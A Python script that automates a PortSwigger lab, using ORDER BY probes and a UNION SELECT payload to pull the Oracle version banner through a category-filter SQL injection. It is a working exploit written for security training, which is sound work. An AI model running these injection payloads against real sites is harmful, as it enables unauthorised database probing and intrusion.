# SQL injection attack, querying the database type and version on Oracle

# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import argparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s' % injection_uri)
	return r

def get_version(s, url, string, columns_count):
	filter_path = url + '/filter?category='
	payload = "' UNION SELECT banner, NULL FROM v$version--"
	print('[+] Trying to retrieve Version strings...')
	r = send_payload(s, filter_path, payload)
	res = r.text
	if string in res:
		print('[+] Successfully Retrieved Oracle Version strings:\n%s' % string)
	else:
		return False

def exploit_sqli(s, url):
	filter_path = url + '/filter?category='
	print('[+] Using the ORDER BY method to retrieve the number of columns !')
	for i in range(1, 8):
		payload = "' ORDER BY %s--" % i
		if send_payload(s, filter_path, payload).status_code == 500:
			print('\n[+] Number of Columns returned:\t%s' % (i - 1))
			return i - 1


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection attack, querying the database type and version on Oracle')
	parser = argparse.ArgumentParser(description="[+] Lab: SQL injection attack, querying the database type and version on Oracle")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Determining the number of columns returned by the query...\n')
			payload = "' UNION SELECT NULL, NULL"
			columns_count = exploit_sqli(s, url) 
			if columns_count:
				r = s.get(url)
				try:
					string = re.search("Make the database retrieve the strings: '(.*)'", r.text).group(1)
				except:
					print('\n[-] NOT ABLE TO RETRIEVE THE STRING, LAB ALREADY SOLVED <!>')
					exit(-1)
				if string:
					get_version(s, url, string, columns_count)
					time.sleep(5)
					s.cookies.clear()
					s.headers.clear()
					r = s.get(url)
					if 'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved !')
				else:
					print('\n[-] SQL Injection Failed <!>')
			else:
				print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)


if __name__ == "__main__":
	main()
